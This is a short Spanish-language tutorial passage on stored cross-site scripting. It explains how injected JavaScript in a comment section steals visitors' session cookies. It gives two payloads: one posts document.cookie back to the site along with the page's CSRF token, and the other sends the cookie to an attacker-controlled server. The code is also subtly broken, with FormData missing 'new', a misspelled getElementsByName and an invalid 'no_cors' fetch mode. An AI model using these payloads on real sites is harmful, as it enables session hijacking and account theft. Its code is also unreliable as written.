En este caso cuando se inyecta el código JavaScript  el cual se encarga de enviarle las cookies session de quien entre a la pagina a el atacante, esto se puede hacer de dos formas, una de ellas es enviando esta cookie obtenida a un servidor del cual como atacantes tengamos control, otra forma es representar esa cookie en el servidor, empezaremos haciéndolo sin el servidor, para que este ataque funcione tiene que haber alguna forma de publicar algo en la pagina y que los demas lo puedan ver, como comentarios:

```js

window.addEventListener('DOMContentLoaded', function(){

var data = FormData();
var token = document.getElementByName('csrf')[0].value

data.append('csrf', token);
data.append('parametro2', document.cookie); // <- Robo de cookie
data.append('parametro3', "valor3");
data.append('parametro4', "valor4");

fetch('url_post', {
	method: 'Post',
	mode: 'no_cors',
	body: data

});
});
```

En caso de que haya un servidor publico que podamos usar como atacantes, el código seria un poco distinto:

```js

window.addEventListener('DOMContentLoaded', function(){

fetch('url_post', {
	method: 'POST',
	mode: 'no_cors',
	body: document.cookie

});
});
```





